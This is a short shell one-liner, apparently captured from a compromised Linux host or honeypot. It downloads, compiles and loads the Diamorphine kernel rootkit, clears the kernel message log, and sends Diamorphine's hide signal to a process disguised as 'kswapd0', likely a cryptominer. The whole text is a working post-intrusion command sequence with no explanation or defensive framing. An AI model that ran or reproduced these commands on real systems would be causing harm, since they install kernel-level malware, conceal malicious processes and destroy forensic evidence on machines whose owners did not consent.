...
cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && yum update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y && yum install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
